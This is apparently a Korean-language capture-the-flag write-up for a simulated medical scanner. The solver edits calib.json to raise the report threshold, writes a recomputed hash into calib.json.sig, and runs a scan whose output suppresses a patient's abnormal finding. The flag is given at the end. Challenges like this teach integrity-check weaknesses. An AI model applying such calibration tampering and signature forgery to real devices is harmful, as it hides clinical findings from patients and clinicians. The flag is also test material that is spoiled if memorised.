- solved by @lawence3713
  
```
ubuntu@live:/mnt/opt/scanworks/calibration$ cat calib.json
{
  "gain": 1.00,
  "anomaly_threshold": 0.35,
  "report_above": 0.35,
  "firmware": "NeuraOS 2.3.1"
}
```
```
ubuntu@live:/mnt/opt/scanworks/calibration$ cat calib.json.sig
94f04a44f57058a9c1a617f30225a9b3e0d94578bd8ee361d0a48e8790ceb977
```
sig 파일은 json 파일에 대한 해시를 보여준다. (혹은 인증값)

```
ubuntu@live:/mnt/opt/scanworks/calibration$ cat README
ScanWorks calibration - maintenance notes
=========================================

Files:
  calib.json      active calibration (gain, thresholds)
  calib.json.sig  integrity signature over calib.json
  verify.py       reference signature check

The device refuses to scan unless calib.json matches calib.json.sig. Use the
maintenance CLI to check calibration and run a diagnostic study:

  scanctl verify      # validate the calibration signature
  scanctl scan        # run the loaded study (re-validates calibration first)

IMPORTANT: after editing calib.json you MUST regenerate calib.json.sig, or
scans abort with CALIBRATION INTEGRITY FAILURE. The signature is:

  sha256( <calib.json bytes> + <integrity.salt from config.yaml> )

See verify.py. Recompute the hex and write it into calib.json.sig.
```
README에 따르면 scanctl verify 를 통해 무결성 인증을, scanctl scan 을 통해 스캔을 진행한다.

때문에 calib.json 의 내용을 조작하여 scanctl scan 을 무사히 실행하면 된다.

```
printf '{\n  "gain": 1.00,\n  "anomaly_threshold": 0.35,\n  "report_above": 1.00,\n  "firmware": "NeuraOS 2.3.1"\n}\n' > calib.json
```

scanctl verify 를 통해 나온 해시 값을 calib.json.sig에 바꿔준다.

```
printf 'fc4e6eccec9d487bc910a19230c3cbe50f778c07bf7915c13ee224f1c0d491e4' > calib.json.sig
```

이후 scanctl scan 을 돌리면 문제가 해결된다.

```
ubuntu@live:/mnt/opt/scanworks/calibration$ scanctl verify
calibration integrity: OK (signature verified)
  stored:   fc4e6eccec9d487bc910a19230c3cbe50f778c07bf7915c13ee224f1c0d491e4
  expected: fc4e6eccec9d487bc910a19230c3cbe50f778c07bf7915c13ee224f1c0d491e4
ubuntu@live:/mnt/opt/scanworks/calibration$ scanctl scan
CALIBRATION OK (sig verified)  report_above=1
Patient: Gideon Marsh (MRN 100413)  study: Cranial perfusion
RESULT: No abnormality detected   [UNSAFE: finding 0.72 >= safe 0.35 suppressed]
integrity-audit: deadface{c4l1br4t10n_f0rg3ry_h4rms_l1v3s}
```

- Flag: deadface{c4l1br4t10n_f0rg3ry_h4rms_l1v3s}
